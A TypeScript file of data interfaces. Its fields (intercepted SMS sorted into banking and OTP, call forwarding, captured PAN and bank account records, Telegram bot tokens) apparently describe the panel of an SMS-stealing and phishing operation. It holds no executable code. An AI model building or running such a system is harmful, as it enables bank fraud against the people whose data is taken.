export interface Device {
  id: string;
  deviceId: string;
  ownerUid: string;
  displayName: string;
  phoneNumber?: string;
  sim1Number: string;
  sim1Carrier: string;
  sim2Number?: string;
  sim2Carrier?: string;
  selectedSim: 1 | 2;
  connectionStatus: string; // e.g. "secure , not available" or "secure , secure"
  batteryPercentage: number;
  networkStatus: 'connected' | 'offline';
  forwardingNumber?: string;
  isForwardingActive?: boolean;
  updatedAt: string;
  createdAt: string;
}

export interface Message {
  id: string;
  messageId: string;
  deviceId: string;
  ownerUid: string;
  senderLabel: string;
  body: string;
  category?: 'banking' | 'otp' | 'telecom' | 'general' | 'government';
  createdAt: string;
  timestamp: string;
  isOld?: boolean;
}

export interface FormRecord {
  id: string;
  recordId: string;
  deviceId: string;
  ownerUid: string;
  fields: {
    name?: string;
    dob?: string;
    mobile?: string;
    pan?: string;
    id?: string;
    accountNo?: string;
    ifsc?: string;
    address?: string;
    [key: string]: string | undefined;
  };
  createdAt: string;
}

export interface UserProfile {
  uid: string;
  email: string;
  displayName: string;
  role: 'admin' | 'user';
  status: 'active' | 'suspended';
  contactNumber: string;
  telegramChatId?: string;
  telegramBotToken?: string;
  createdAt: string;
}

export interface AppSettings {
  appName: string;
  supportContact: string;
  supportTelegram?: string;
  theme: string;
  teleBotToken?: string;
  teleChatId?: string;
  updatedAt: string;
}

export interface AuditLog {
  id: string;
  actorUid: string;
  actorEmail?: string;
  action: string;
  details: string;
  timestamp: string;
}
